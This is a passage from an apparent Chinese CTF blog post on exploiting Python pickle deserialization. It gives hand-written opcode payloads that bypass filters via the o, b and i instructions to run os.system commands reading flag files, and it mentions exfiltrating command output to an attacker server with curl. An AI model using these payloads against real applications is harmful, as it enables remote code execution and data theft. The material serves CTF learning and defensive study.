<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-f60a5ad59d548b1ca78b839320318dfe_1440w.jpg" alt="img"></p>
<p>payload</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-377763e71f5d198566d7b40e418289f8_1440w.jpg" alt="img"></p>
<p>pickle.loads()效果</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-0c450bc39b3ce69cdf14486ed14752c1_1440w.jpg" alt="img"></p>
<p><code>pickle.loads()</code>时，<code>ls /</code>的结果被base64编码后发送给服务器（红框）；我们的服务器查看日志，就可以得到命令执行结果。因此，在没有回显的时候，我们可以通过<code>curl</code>把执行结果送到我们的服务器上。</p>
<p>上文发出去的请求缺了一段，是因为url没有加引号。</p>
<p>GLOBAL操作符</p>
<pre><code class="highlight plaintext">GLOBAL操作符读取全局变量，是使用的find_class函数。而find_class对于不同的协议版本实现也不一样。总之，它干的事情是“去x模块找到y”，y必须在x的顶层（也即，y不能在嵌套的内层）</code></pre>
<h3 id="手搓opcode"><a class="markdownIt-Anchor" href="#手搓opcode"></a> 手搓opcode</h3>
<p>只要会自己写opcode事情就简单多了。把。</p>
<ol>
<li>o指令绕过</li>
</ol>
<pre><code class="highlight plaintext">payload1 = b&#x27;&#x27;&#x27;(cos
system
S&#x27;cat /f* &gt; /tmp/a&#x27;
o.&#x27;&#x27;&#x27;</code></pre>
<blockquote>
<p>先是用 ( 入栈一个MARK，然后用 c 导入os.system()函数入栈，然后用 S 定义字符串并入栈，最后用 o **寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数，*<em>结果是os.system(cat /f</em> &gt; /tmp/a’o)， 点号是结束的意思</p>
</blockquote>
<ol start="2">
<li>b指令绕过</li>
</ol>
<pre><code class="highlight plaintext">payload2 =(c__main__
User
o&#125;(S&quot;\x5f\x5f\x73\x65\x74\x73\x74\x61\x74\x65\x5f\x5f&quot; //__setstate__
cos
system
ubS&quot;cat /ffl14aaaaaaagg&gt;/tmp/gkjzjh146&quot;
b.</code></pre>
<p>3.s指令绕过</p>
<p>如果<code>'</code>或者<code>&quot;</code>被ban了的话怎么办捏，可以用V来代替</p>
<pre><code class="highlight plaintext">S&#x27;ls&#x27;
和
Vls
是一样的效果</code></pre>
<p>4.i一把梭</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
opcode=<span class="string">b&#x27;&#x27;&#x27;(Vls</span>
<span class="string">ios</span>
<span class="string">system</span>
<span class="string">.&#x27;&#x27;&#x27;</span>
pickle.loads(opcode)</code></pre>
<p>直接代替了c和o的功能</p>
]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
</search>
